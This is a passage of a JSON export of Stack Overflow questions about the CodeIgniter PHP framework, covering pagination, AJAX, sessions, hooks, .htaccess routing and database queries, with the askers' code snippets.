inbox</p>\n"},{"tags":["php","codeigniter","crud"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12714392,"title":"Will 2009 tutorial code be compatible with current version of Code Igniter?","body":"<p>I'm want to learn how to create a simple <strong>CRUD</strong> using <strong>Code Igniter</strong>.</p>\n\n<p><strong><a href=\"http://henrihnr.wordpress.com/2009/04/26/simple-crud-application/\" rel=\"nofollow\">This tutorial</a></strong> is exactly what I need, but it was posted in <strong>2009</strong>.</p>\n\n<p>Will all of this tutorial code be compatible with the latest <strong>Code Igniter</strong> version?</p>\n"},{"tags":["codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1007,"score":3,"question_id":6500022,"title":"Codeigniter : calling a method of one controller from other","body":"<p>I have two controllers 'a' and 'b'</p>\n\n<p>I would like to call a method of controller 'a' from a method of controller ''b'</p>\n\n<p>could anyone guide me how can I achieve this</p>\n\n<p>all efforts appreciated thanks</p>\n"},{"tags":["php","jquery","ajax","codeigniter","shopping"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":110,"score":0,"question_id":12252900,"title":"How to ajaxify a shopping cart on codeigniter","body":"<p>I'm having problems ajaxifying a shopping cart built on codeigniter.  When a user clicks on an add button on a drop down menu for items, the item becomes added unto a div called #cart via ajax callback function.  However my issue is that the content generated via ajax in the cart div is not permenant (since this is done on the client side).  Is there a way to make the cart html output permenant while still using ajax? Although My ajax call is outputing the content from my controller, i checked out the view source and there is actually no html elements on it.Here is my ajax call:  </p>\n\n<pre><code>             $(document).ready(function() {\n\n\n            $('.add').click(function(){\n                var button =$(this).val();\n                var button = button.split(',');\n                var url=&lt;?php echo '\"' . base_url() . 'index.php/order_form/add/\"' ?&gt;+button[0]+'/'+button[1];\n                var quantity=$('#quantity-'+button[0]).val();\n\n                $.ajax({\n                    url: url,\n                    data:'quantity='+quantity,\n                    dataType: 'html',\n                      success: function(output_string){\n\n\n\n                        $('#cart').empty().append(output_string);\n\n                    } \n                }); \n\n                });\n            });\n</code></pre>\n"},{"tags":["arrays","codeigniter","object","foreach"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":3,"view_count":49,"score":-2,"question_id":12684989,"title":"accessing array and objects","body":"<p>I have a problem with printing my data. In my program, i get the data which was in object and put in an array. say array1[$id] = dataobject. the whole array1 then will be put to array2['list'] like array2['list'] = array1;</p>\n\n<p>the problem is how do i get the data such as the id, name and description.. here's the print_r of the whole array:</p>\n\n<p>this is actually the result of the array, i am not sure how to access this. i want to foreach and get the name and print them:</p>\n\n<pre><code>Array ( \n[list] =&gt; Array ( \n    [0] =&gt; Array ( \n        [0] =&gt; stdClass Object ( \n            [id] =&gt; 1 \n            [name] =&gt; harry potter 4 \n            [description] =&gt; harry potter and the goblet of fire book by j.k. rowling \n            [unit_price] =&gt; 300.99 \n        ) \n    ) \n    [1] =&gt; Array (\n        [0] =&gt; stdClass Object ( \n            [id] =&gt; 4\n            [name] =&gt; lipton tea\n            [description] =&gt; yellow label tea\n            [unit_price] =&gt; 15.00 \n        ) \n    ) \n    [2] =&gt; Array (\n        [0] =&gt; stdClass Object (\n            [id] =&gt; 9\n            [name] =&gt; tisyu\n            [description] =&gt; tissue twenty pieces\n            [unit_price] =&gt; 20.00\n        ) \n    )\n\n) \n\n)\n</code></pre>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12711378,"title":"Adding an Array multiple times in the DB via Controller","body":"<p>I'm having an issue producing this array multiple times upon how many coupons purchased.</p>\n\n<p>Now it looks like</p>\n\n<pre><code>$coupon_array = array(\n    'user_id'=&gt;$_POST[\"user_id\"],\n    'mergent_id'=&gt;$_POST[\"merchant_id\"],\n    'deals_id'=&gt;$_POST[\"deal_id\"],\n    'order_id'=&gt;$order_id,\n    'secret'=&gt;$secret,\n    'expire_time'=&gt;$time,\n    'create_time'=&gt;$time,\n    'status'=&gt;1\n   );\n\n   $this-&gt;common_model-&gt;insertData('coupon', $coupon_array);\n</code></pre>\n\n<p>But i have a post value such as: </p>\n\n<pre><code>\"quantity\"=&gt;$_POST[\"quantity\"]\n</code></pre>\n\n<p>and i would like to produce this X times. Example:</p>\n\n<pre><code>$quantity x $this-&gt;common_model-&gt;insertData('coupon', $coupon_array);\n</code></pre>\n\n<p>Sorry for my english, and i hope i explain this so it's understandable... ;)</p>\n\n<p>Another one! when we insert the coupons they all have the same md5($secret), is it possible to have that also with all the different code...</p>\n\n<pre><code> $secret = md5($secret);\n\n\n   $coupon_array = array(\n    'user_id'=&gt;$_POST[\"user_id\"],\n    'mergent_id'=&gt;$_POST[\"merchant_id\"],\n    'deals_id'=&gt;$_POST[\"deal_id\"],\n    'order_id'=&gt;$order_id,\n    'secret'=&gt;$secret,\n    'expire_time'=&gt;$time,\n    'create_time'=&gt;$time,\n    'status'=&gt;1\n   );\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12711185,"title":"Why isn't my controller passing the variable to my view from the db query in my model?","body":"<h1>model</h1>\n\n<pre><code>public function cart()\n{\n\n    $this-&gt;load-&gt;model('Cart_model');\n    $this-&gt;load-&gt;view('head');\n    $data['pricing'] = $this-&gt;Cart_model-&gt;R_products();\n    $this-&gt;load-&gt;view('cart', $data);\n    $this-&gt;load-&gt;view('footer');    \n}\n</code></pre>\n\n<h1>view</h1>\n\n<pre><code>var_dump($data);\n</code></pre>\n\n<p>This produces error \"\nA PHP Error was encountered</p>\n\n<p>Severity: Notice</p>\n\n<p>Message: Undefined variable: data</p>\n\n<p>Filename: views/cart.php</p>\n\n<p>Line Number: 4\n\"</p>\n\n<p>However if I insert in my <code>VIEW</code></p>\n\n<pre><code>$data = $this-&gt;Cart_model-&gt;R_products();\n</code></pre>\n\n<p>Then all is well. But why isn't the controller doing it's job?</p>\n\n<h1>model</h1>\n\n<pre><code>class Cart_model extends CI_Model {\n\n    function R_products() \n    {\n\n        return $this-&gt;db-&gt;get('pricing')-&gt;result();\n    }\n\n}\n</code></pre>\n"},{"tags":["facebook","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12694357,"title":"How to delete facebook parameters that puts the url's shared on your wall in codeigniter links","body":"<p>When I share a link <a href=\"http://www.totalrunning.com/results/misFotos/TTRCAR1346364033/283\" rel=\"nofollow\">http://www.totalrunning.com/results/misFotos/TTRCAR1346364033/283</a> (Codeigniter Url's) on my Facebook wall appears fine but when clicking the resulting URL is: <a href=\"http://www.totalrunning.com/results/misFotos/TTRCAR1346364033/283?fb_action_ids=441641579216005&amp;fb_action_types=og.likes&amp;fb_source=aggregation&amp;fb_aggregation_id=288381481237582\" rel=\"nofollow\">http://www.totalrunning.com/results/misFotos/TTRCAR1346364033/283?fb_action_ids=441641579216005&amp;fb_action_types=og.likes&amp;fb_source=aggregation&amp;fb_aggregation_id=288381481237582</a> </p>\n\n<p>fb_action_ids added among other parameters this causes the url not resolving correctly</p>\n\n<p>That I can do to make facebook not put those parameters in my url or like handling with Codeigniter ??? </p>\n\n<p>Thanks</p>\n"},{"tags":["php","codeigniter","pagination"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12710306,"title":"Codeigniter / Pagination / uri_to_assoc()","body":"<p>I am trying to paginate through a list of products which are searched for by defining various uri segments passed through to a single controller function browse().  Using CI's uri_to_assoc() I am building up a list of key pairs passed through to a SQL query.  However I am having real difficulties trying to get my head around how the pagination on this could work.  I'll give a few examples which will hopefully illustrate my problem.  </p>\n\n<p>I want to be able to browse products listed on my site by category, brand or range.  A user should be able to browse any combination of these 3 search elements such as:</p>\n\n<ul>\n<li><a href=\"http://mysite.com/our-products/browse\" rel=\"nofollow\">http://mysite.com/our-products/browse</a> = browse all</li>\n<li><a href=\"http://mysite.com/our-products/browse/category/cabinets+%26+storage\" rel=\"nofollow\">http://mysite.com/our-products/browse/category/cabinets+%26+storage</a> - list products from the category Cabinets &amp; Storage</li>\n<li><a href=\"http://mysite.com/our-products/browse/category/cabinets+%26+storage/brands/ramon+soler\" rel=\"nofollow\">http://mysite.com/our-products/browse/category/cabinets+%26+storage/brands/ramon+soler</a> - list products from the category Cabinets &amp; Storage where brand is Ramon Soler </li>\n<li><a href=\"http://mysite.com/our-products/browse/category/cabinets+%26+storage/range/texas\" rel=\"nofollow\">http://mysite.com/our-products/browse/category/cabinets+%26+storage/range/texas</a> - list products from the category Cabinets &amp; Storage where range is Texas</li>\n<li><a href=\"http://mysite.com/our-products/browse/brand/ramon+soler/range/texas\" rel=\"nofollow\">http://mysite.com/our-products/browse/brand/ramon+soler/range/texas</a> - list products from the brand Ramon Soler where range is Texas</li>\n<li>etc etc...</li>\n</ul>\n\n<p>The problem is when it comes to pagination, CI always adds this to the end of the url.  So depending on the depth of the query the position of the offset parameter in the url varies.</p>\n\n<p>Anyone any ideas how to introduce the offset segment into this format so I always know exactly where it is regardless of which every combination of link use from above?  Also remember than on the first load of these pages no offset segment will be set at all and will only be present on subsequent page loads.  </p>\n\n<p>I'd prefer not to have to use query strings if possible and stick to a url segment based approach.</p>\n\n<p>Thanks. </p>\n"},{"tags":["php","apache","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":32,"score":-1,"question_id":12707170,"title":"Apache Error application failed to start because SSLEAY32.dll was not found","body":"<p>After enabling openssl module in PHP and restarting apache server it gives the following error:</p>\n\n<blockquote>\n  <p>application failed to start because SSLEAY32.dll was not found </p>\n</blockquote>\n\n<p>How to fix this?</p>\n"},{"tags":["codeigniter","twitter-bootstrap","typeahead"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":136,"score":-1,"question_id":12708673,"title":"Using Twitter Bootstrap Typeahead plugin in CodeIgniter","body":"<p>I was looking all day on how I can apply twitter bootstrap's typeahead plugin and can't find anything. Now, how can I use twitter bootstrap typeahead in codeigniter?</p>\n"},{"tags":["codeigniter","pagination"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":12707973,"title":"records per page allow user to choose - codeigniter pagination","body":"<p>I have pagination that works. I have set the limit to 5 records per page, but I will like the user to be able to change that if he want. Problem is i have no idea how to do it.</p>\n\n<p>In the view, I created drop down menu, so user can choose how many records he want to see per page:</p>\n\n<pre><code> &lt;ul class=\"dropdown-menu\"&gt;\n    &lt;li&gt;\n        &lt;a href=\"&lt;?php echo base_url(); ?&gt;backOfficeUsers/displayAllUsers\" id=\"2\" class=\"pPage\" data-tableid=\"smpl_tbl\"&gt;\n        2 records per page\n        &lt;/a&gt;\n    &lt;/li&gt;\n    &lt;li&gt;\n        &lt;a href=\"&lt;?php echo base_url(); ?&gt;backOfficeUsers/displayAllUsers\"  id =\"50\" class=\"pPage\" data-tableid=\"smpl_tbl\"&gt;\n        50 records per page\n        &lt;/a&gt;\n    &lt;/li&gt;\n    &lt;li&gt;&lt;a href=\"&lt;?php echo base_url(); ?&gt;backOfficeUsers/displayAllUsers\" id=\"100\" class=\"pPage\" data-tableid=\"smpl_tbl\"&gt;\n        100 records per page\n        &lt;/a&gt;\n    &lt;/li&gt;\n    &lt;li&gt;\n        &lt;a href=\"&lt;?php echo base_url(); ?&gt;backOfficeUsers/displayAllUsers\" id=\"all\" class=\"pPage\" data-tableid=\"smpl_tbl\"&gt;\n        Display all records\n        &lt;/a&gt;\n    &lt;/li&gt;\n&lt;/ul&gt;\n</code></pre>\n\n<p>In my controller, I have the following code:</p>\n\n<pre><code>public function displayAllUsers()\n    {\n\n\n        $recordsPerPage = 5;\n        $limit = $recordsPerPage;\n        $offset = 3;\n\n        $offset = $this-&gt;uri-&gt;segment(3);\n        $this-&gt;db-&gt;limit($limit, $offset);\n\n        $data['users'] = $this-&gt;backOfficeUsersModel-&gt;get();\n\n        $totalresults = $this-&gt;db-&gt;get('back_office_users')-&gt;num_rows();\n\n        //initializing &amp; configuring paging\n        $this-&gt;load-&gt;library('pagination');\n        $config['base_url'] = site_url('/backOfficeUsers/displayAllUsers');\n        $config['total_rows'] = $totalresults;\n        $config['per_page'] = $limit;\n        $config['uri_segment'] = 3;\n        $config['full_tag_open'] = '&lt;div class=\"dataTables_paginate paging_bootstrap pagination\"&gt;&lt;ul&gt;';\n        $config['full_tag_close'] = '&lt;/ul&gt;&lt;/div&gt;';\n        $config['cur_tag_open'] = '&lt;li&gt;&lt;a href=# style=\"color:#ffffff; background-color:#258BB5;\"&gt;';\n        $config['cur_tag_close'] = '&lt;/a&gt;&lt;/li&gt;';\n        $config['num_tag_open'] = '&lt;li&gt;';\n        $config['num_tag_close'] = '&lt;/li&gt;';\n\n        $this-&gt;pagination-&gt;initialize($config); \n\n\n\n        $data['main_content'] = 'bousers/users';\n        $data['title'] = 'Back Office Users';\n        $errorMessage = FALSE;\n\n\n        $this-&gt;load-&gt;vars($data,$errorMessage);\n        $this-&gt;load-&gt;vars($currentUser);\n        $this-&gt;load-&gt;view('backOffice/template');\n\n\n    } // end of function displayAllUsers\n</code></pre>\n\n<p>Can anyone tell me how can i display number of records that user selected from the drop down menu? If he doesn't select anything, I would like to display 5 records by default.</p>\n\n<p>Any help will be deeply appreciated. </p>\n\n<p>Regards,Zoran</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12705206,"title":"What type of Codeigniter hook point would be suitable?","body":"<p>I have the same bit of code, that I want to execute at certain points in every action in every controller in my Codeigniter project. Which hook points would be the correct ones to use?</p>\n\n<pre><code>class Pages extends CI_Controller {\n\n    public function index(){\n\n        // Execute first hook here\n\n        $this-&gt;load-&gt;view('pages/index', $data);\n\n        // Execute second hook here\n\n    }\n\n}\n</code></pre>\n\n<p>I am looking for two answers: the first answer for the first hook and the second for the second hook please. Thanks.</p>\n\n<p>The hooks manual page is here and the hook points are explained at the bottom, but I can't figure out which ones are correct for my script.</p>\n\n<p><a href=\"http://codeigniter.com/user_guide/general/hooks.html\" rel=\"nofollow\">http://codeigniter.com/user_guide/general/hooks.html</a></p>\n"},{"tags":["php","codeigniter","http-status-code-500"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12701341,"title":"Codeigniter HTTP Error 500 from model?","body":"<p>I am new to Codeigniter.  I'm trying to create a simple customer database and when it keeps trying to load my update_customer model It keeps giving me a Http error 500.  I'm pretty sure I've narrowed it down to the model cause when I comment out the model call the page redirects it to itself with no error.  Any ideas where my mistake was?</p>\n\n<p>and I can't seem to find the error in the apache error logs...</p>\n\n<p>CONTROLLER:</p>\n\n<pre><code>function edit_customer($id){\n    $data['success']=0;\n    if($_POST){\n        $data_customer=$_POST;\n        $data_customer['active'] = 1;\n        $this-&gt;customer-&gt;update_customer($id,$data);\n        $data['success']=1;\n    }\n    $data['customer']=$this-&gt;customer-&gt;get_customer($id);\n\n    $this-&gt;load-&gt;view('header');\n    $this-&gt;load-&gt;view('edit_customer',$data);\n    $this-&gt;load-&gt;view('footer');\n}\n</code></pre>\n\n<p>MODEL:</p>\n\n<pre><code>function get_customer($id){\n    $this-&gt;db-&gt;select()-&gt;from('customers')-&gt;where(array('active'=&gt;1, 'id'=&gt;$id))-&gt;order_by('date_added', 'desc');\n    $query=$this-&gt;db-&gt;get();\n    return $query-&gt;first_row('array');\n}\n\nfunction update_customer($id, $data){\n    $this-&gt;where('id', $id);\n    $this-&gt;db-&gt;update('customers', $data);\n}\n</code></pre>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":714,"score":0,"question_id":9913796,"title":"How do I test if my MySQL update query was successful in Code Igniter?","body":"<p>I have a model function that updates a user in my Code Igniter application:</p>\n\n<pre><code>// updates first of a user, return true if successful, false if not.\npublic function updateFirstName($userId, $newFirstName) {\n    $this-&gt;db-&gt;query(\"UPDATE users SET firstName='$newFirstName' WHERE id=$userId\");\n    return // whether request was successful?\n}\n</code></pre>\n\n<p>How do I return a boolean value that ensures the user of ID <code>$userId</code> has been updated? For instance, it should return false if no user was found with ID <code>$userId</code>.</p>\n"},{"tags":["jquery","ajax","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12700783,"title":"how to get the value of varable which has been posted via ajax to the controller?","body":"<p>I have the following code:</p>\n\n<pre><code>$('.pPage').click(function(){         \n    var recordsPerPage = $(this).attr('id');\n    $.ajax({\n        type: \"POST\",\n        dataType: 'json',\n        url: \"backOfficeUsers/displayAllUsers\",\n        data: { value: recordsPerPage }\n    }).done(function( msg ) {\n        alert( \"Data Saved: \" + msg );\n    });\n});\n</code></pre>\n\n<p>I need to manipulate recordsPerPage variable in my controller. How can I accept the value of this variable in my controller and use it in my php?</p>\n\n<p>Here is the code for the controller:</p>\n\n<pre><code>public function displayAllUsers()\n{\n\n    $currentUser = $this-&gt;isLoggedIn();\n    $this-&gt;load-&gt;model('backOfficeUsersModel');\n    $this-&gt;db-&gt;order_by('userid');\n\n\n    $myrec = $this-&gt;input-&gt;post('value');\n    $recordsPerPage = $myrec; \n\n\n    $limit = $recordsPerPage;\n    $offset = 3;\n\n    $offset = $this-&gt;uri-&gt;segment(3);\n    $this-&gt;db-&gt;limit($limit, $offset);\n\n    $data['users'] = $this-&gt;backOfficeUsersModel-&gt;get();\n\n    $totalresults = $this-&gt;db-&gt;get('back_office_users')-&gt;num_rows();\n\n    //initializing &amp; configuring paging\n    $this-&gt;load-&gt;library('pagination');\n    $config['base_url'] = site_url('/backOfficeUsers/displayAllUsers');\n    $config['total_rows'] = $totalresults;\n    $config['per_page'] = $limit;\n    $config['uri_segment'] = 3;\n    $config['full_tag_open'] = '&lt;div class=\"dataTables_paginate paging_bootstrap pagination\"&gt;&lt;ul&gt;';\n    $config['full_tag_close'] = '&lt;/ul&gt;&lt;/div&gt;';\n    $config['cur_tag_open'] = '&lt;li&gt;&lt;a href=# style=\"color:#ffffff; background-color:#258BB5;\"&gt;';\n    $config['cur_tag_close'] = '&lt;/a&gt;&lt;/li&gt;';\n    $config['num_tag_open'] = '&lt;li&gt;';\n    $config['num_tag_close'] = '&lt;/li&gt;';\n\n    $this-&gt;pagination-&gt;initialize($config); \n\n\n\n    $data['main_content'] = 'bousers/users';\n    $data['title'] = 'Back Office Users';\n    $errorMessage = FALSE;\n\n\n    $this-&gt;load-&gt;vars($data,$errorMessage);\n    $this-&gt;load-&gt;vars($currentUser);\n    $this-&gt;load-&gt;view('backOffice/template');\n\n\n} // end of function displayAllUsers\n</code></pre>\n"},{"tags":["php","codeigniter","pagination"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":10879458,"title":"why paging links does not display?","body":"<p>I am new in PHP Codeigniter. I am trying to apply paging in my web page for that I have used following code</p>\n\n<pre><code>$config['base_url'] = base_url().'index.php/admin/pages/index/';\n        $config['total_rows'] = $this-&gt;pages_model-&gt;count_pages();\n        $config['per_page'] = '1';\n        $config['full_tag_open'] = '&lt;p&gt;';\n        $config['full_tag_close'] = '&lt;/p&gt;';\n\n        $this-&gt;pagination-&gt;initialize($config);\n\n\n        $pageData['records']=$this-&gt;pages_model-&gt;get_pages($config['per_page'],$this-&gt;uri-&gt;segment(3));\n</code></pre>\n\n<p>in controller. In view I used following code<code>$this-&gt;pagination-&gt;create_links()</code>\nBut it does not shows the paging links.\nThe main problem is that class variable in Pagignation class $total_rows and $per_page could not be assigned . Its value remains default which is hard coded in Pagingnation.php file.I do not now what is the problem.\nIs there any way to overcome this problem?</p>\n\n<pre><code>enter code here\n</code></pre>\n"},{"tags":["jquery","ajax",".htaccess","codeigniter","tabs"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":146,"score":2,"question_id":12677625,"title":"Load a piece of html in a jQuery tab using jQuery AJAX on Codeigniter","body":"<p>I'm here because I can't load a piece oh html code (a form that contain the client's data) in a JQuery tabs, using JQuery AJAX. \nI tried to use JQuery .load(), .append() .html(), but I can't load a simple html form in a JQuery tab.\nI use <strong>codeigniter</strong> and in the controller there are some function: \none of this named <strong><em>findClient</em></strong> create a CI pagination, that had a table that contain a radio input. </p>\n\n<pre><code>class Management extends CI_Controller {\n\nfunction __construct(){\n    parent::__construct();  \n    $this-&gt;load-&gt;library('myclients');\n    session_start();\n}\n\n\nfunction index($clientsFound=0){\n      ...\n  ...       \n}\n\n\npublic function findCliente(){\n    // generate a pagination, in a table. each row have a radio, \n    // and hads a rispective id of that record\n}\n</code></pre>\n\n<p>When I click on the submit button, in a tab-1....\nI call a JQuery AJAX</p>\n\n<pre><code>$('#fm_submit_report').click(function(event){\n            event.preventDefault();\n            var form_data = {\n                id_client: $('input:checked').val(),\n                ci_csrf_token: $.cookie(\"ci_csrf_token\")\n            };\n            var form = $(this);\n            $.ajax({\n                url: 'management/createReport',\n                type: 'POST',\n                async : false,\n                data: form_data,\n                dataType: 'html',\n                success: function(dati, stato){\n                    $('#tabs').tabs('select',4);\n                    alert('Creation of a Report');\n                    console.log('stato: '+stato+'   received data: '+dati);\n                    $('#create_report').load(dati);\n                    alert('end of load');\n                },\n                error: function(xhr) {\n\n                var message = 'Errore nell\\'invio del form: ';\n                var status = xhr.status;\n                var text = xhr.statusText;\n\n                message += status + ': ' + text;\n\n                $('&lt;div class=\"error\"/&gt;').text(message).\n                appendTo(form);\n\n                }\n            });\n            return false;\n</code></pre>\n\n<p>This ajax, pass the cient id, to the method <strong><em>createReport()</em></strong>. As U can see, this method, get the client informations using <em>myclients</em> library, and after pass this information, in a \"<em>piece of html code</em>\" to create a form with the client data inside  </p>\n\n<pre><code>public function createReport(){\n    $client=$this-&gt;myclients-&gt;findClientById($this-&gt;input-&gt;post('id_cliente'));\n    $data['client'] = $client;\n // this is a client information to pass in the view to generate the form, that will load in a tab\n\n   $hthmlcode=$this-&gt;load-&gt;view('create_report', $data);\n   // create_view is the html form \n\n echo $htmlcode;\n}\n\n}/* End of function createReport */\n</code></pre>\n\n<p>The html code to load in a JQuery tab is this</p>\n\n<pre><code>&lt;table&gt;\n&lt;tr&gt;\n    &lt;td&gt;                                                         \n        &lt;table style=\"margin-top:0\" cellpadding=\"0\" cellspacing=\"0\" border=\"0\"&gt;\n            &lt;?php echo form_open('management/storeReport') ?&gt;\n            &lt;tr&gt;\n                &lt;td class=\"report_left\"&gt;&lt;h2&gt;Visit Date&lt;/h2&gt;&lt;/td&gt;\n                &lt;td class=\"report_dx\"&gt;&lt;?php echo form_input('data_visita', '', 'class=\"data\", id=\"datepickervisita\"'); ?&gt;&lt;/td&gt;\n            &lt;/tr&gt;\n            [ ...cut ...]\n            &lt;/tr&gt;\n        &lt;/table&gt;\n        &lt;?php echo form_input($btnInviaReport); ?&gt;\n\n        &lt;?php echo form_close(); ?&gt;\n        &lt;div class=\"error_report\"&gt;&lt;/div&gt;\n    &lt;/td&gt;  \n&lt;/tr&gt;    \n&lt;/table&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>But unfortunately the code in html was not loaded in the 5th tabs... and the post return the entire page (instead my html form) !!!</p>\n\n<p>I noticed, in firebug console,that the path of <em>controller/method</em> that I set in the url of ajax, is wrong, in fatc i set </p>\n\n<pre><code>url: 'management/createReport'\n</code></pre>\n\n<p>but in the console i see that the post is send to this address:</p>\n\n<pre><code>http://_local_ip_/management/management/createReport\n</code></pre>\n\n<p>but, obviously, if I don't set the controller (just set url:'createReport'), the return variable \"dati\" will be empty, because I call a method of an undefined controller</p>\n\n<pre><code>success: function(dati, stato)\n</code></pre>\n\n<p>I suspect, that my <em>.htaccess</em> file is the cause of this trouble (why the name of controller is repeated twice, when the ajax is called ???)</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n\n    #Removes access to the system folder by users.\n    #Additionally this will allow you to create a System.php controller,\n    #previously this would not have been possible.\n    #'system' can be replaced if you have renamed your system folder.\n    RewriteCond %{REQUEST_URI} ^system.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    RewriteCond %{ENV:REDIRECT_STATUS} 200\n    RewriteRule .* - [L]\n\n    RewriteRule ^(system|application) - [F,L]\n\n    #When your application folder isn't in the system folder\n    #This snippet prevents user access to the application folder\n    #Submitted by: Fabdrol\n    #Rename 'application' to your applications folder name.\n    RewriteCond %{REQUEST_URI} ^public.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #Checks to see if the user is attempting to access a valid file,\n    #such as an image or css document, if this isn't true it sends the\n    #request to index.php\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n\n    ErrorDocument 404 /index.php\n&lt;/IfModule&gt; \n</code></pre>\n\n<p>public is the folder of my project, and it's outside of system directory ...</p>\n"},{"tags":["forms","codeigniter","drop-down-menu"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":77,"score":-1,"question_id":12701830,"title":"how to use form_dropdown helper of codeigniter","body":"<p>i am using ci helper form_dropdown for my form to get the required input type as textbox,radio button etc using dropdown menu. for the puropse i am using display_text and multiple_values in db where display_text stores textbox, radio button etc whereas in multiple values I store 0 or 1 depending on whether the input takes multiple values or not.e.g for textarea multiple_values = 0 and for radio button multiple_values = 1.now the problem is during the edit from the controller i am doing    </p>\n\n<pre><code>$data['field_types'] = dropdown_data($field_types, 'display_text' , 'multiple_values');\n</code></pre>\n\n<p>when i send like this the saved value isn't selected,it just selects the first value of dropdown menu always but allows the selection of new value.from the controller when i do like    </p>\n\n<pre><code>$data['field_types'] = dropdown_data($field_types, 'display_text');\n</code></pre>\n\n<p>the result is during edit the saved value is shown but it doesn't allow the change now.\ni want both the earlier selected value to be displayed plus also able to change the value during edit.<br>\nwhere i am making the mistake. thanks in advance for any help/suggestions and your valuable time.</p>\n"},{"tags":["php","mysql","codeigniter","mysql-error-1064","opencart"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":74,"score":-2,"question_id":12701937,"title":"what is wrong with this mysql query","body":"<p>here is the query:</p>\n\n<pre><code>INSERT opencart_product_image SET image = 'C:/xampp/htdocs/bestlicenseplateframes/freelancedeveloper/opencart_v1.5.4.1/image/products/sample.png' WHERE `product_id` = '1245'\n</code></pre>\n\n<p>here is the mysql error message:</p>\n\n<pre><code>Notice: Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE `product_id` = '1245'' at line 1\n</code></pre>\n\n<p>Error No: 1064</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12701016,"title":"How to set userdata in a session in the model of my login function","body":"<p>When a user logs in they are directed to my <code>log in</code> function -- Here is my partially working code. I commented out the parts that I need help with.</p>\n\n<h1>model</h1>\n\n<pre><code>    if ($query-&gt;num_rows() == 1)\n    { \n        return $query-&gt;row()-&gt;f_name;\n    }   \n\n    else {\n        return false;\n    }\n\n}\n</code></pre>\n\n<h1>controller</h1>\n\n<pre><code>    if($this-&gt;form_validation-&gt;run()) {\n    $f_name = $this-&gt;model_users-&gt;can_log_in();\n        $data = array(\n            'email' =&gt; $this-&gt;input-&gt;post('email'),\n            'is_logged_in' =&gt; 1,\n            'name' =&gt; $f_name\n            );\n\n        $this-&gt;session-&gt;set_userdata($data);\n\n        redirect('account_dashboard');  \n</code></pre>\n\n<p>The user's name is in the database table with their email/pw. I want to get the users <code>f_name</code> and set it in the session when they log in since the session is a global var.</p>\n\n<h1>view</h1>\n\n<p>my header shows their name:</p>\n\n<pre><code>echo $this-&gt;session-&gt;userdata('name'); \n</code></pre>\n\n<p>How do I get db_values from the table and pass them along to the session?</p>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":199,"score":0,"question_id":10744268,"title":"Codeigniter: fetching records and sum","body":"<p>I have the following table and I am trying to display the sum of <code>p_total</code> along with all other records in the table. I have managed to display the total amount but if I display it, only values of the fist row of the table shows up. Although the sum of p_total is showing correctly as 600 .</p>\n\n<p>Could you please tell me where is the problem in my code below:</p>\n\n<p>Thanks in advance :)</p>\n\n<p>My DB Table:</p>\n\n<pre><code> p_id   p_name    p_quantity    p_rate   p_total       user_id\n  1     Pepsi        12           30       360            1\n  2     Hot Breads   12           20       240            1\n</code></pre>\n\n<p>I have the following code in my model</p>\n\n<pre><code>$this-&gt;db-&gt;select('*,SUM(temporary_table.p_total AS Total');\n    $this-&gt;db-&gt;from('temporary_table');\n    $this-&gt;db-&gt;where('user_id', $user_id);                                  \n   $getData = $this-&gt;db-&gt;get('');\n  if($getData-&gt;num_rows() &gt; 0)\n    return $getData-&gt;result_array();\n    else\nreturn null;\n</code></pre>\n\n<p>This is my controller:</p>\n\n<pre><code>$this-&gt;load-&gt;model('mod_sales');\n$data['records']= $this-&gt;mod_sales-&gt;add_to_temporary_table($user_id);\n</code></pre>\n\n<p>My View:</p>\n\n<pre><code> foreach ($records as $row){\n\n     &lt;td&gt;&lt;?php echo 